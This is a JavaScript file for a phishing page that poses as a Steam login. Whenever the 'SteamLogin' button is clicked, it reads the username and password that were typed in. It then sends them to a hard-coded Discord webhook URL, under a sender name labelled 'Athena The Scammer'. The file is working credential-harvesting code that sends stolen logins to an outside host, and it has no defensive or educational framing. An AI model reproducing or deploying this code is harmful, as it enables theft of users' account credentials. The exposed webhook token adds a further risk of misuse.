const webhook = "https://discord.com/api/webhooks/1377616406169911437/cc2929u3IYWhqWmnKDhn3Glqj9ZvYc_BD5OoeX_HALyZP4-aj9x5rUEalbNN4PbUZqhP";

function get_input() {
  return {
      username: document.querySelector('input[name="username"]').value.trim(),
      password: document.querySelector('input[name="password"]').value.trim()
  };
}

async function send_data() {
  const { username, password } = get_input();

  if (!username || !password) 
  {
    console.warn("Data is empty — not sending.");
    return;
  }

  const payload  = {
    username: "Athena The Scammer",
    content: `Nickname: ${username}\nPassword: ${password}`
  }

  try {
    const res = await fetch(webhook, 
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (res.ok) 
    {
      console.log("Sent successfully");
    } 
    else if (res.status === 429) 
    {
      const data = await res.json().catch(() => ({}));
      console.warn("Rate limited. Retry after:", data.retry_after || "unknown");
    } 
    else {
      const text = await res.text();
      console.error("Failed to send webhook:", res.status, text);
    }
  } catch (err) 
  {
    console.error("Network or fetch error:", err);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const btn = document.querySelector('#SteamLogin');
  if (btn) 
    {
        btn.addEventListener('click', send_data);
        console.log("Found")
    }
  else { console.log("Btn not found")}
});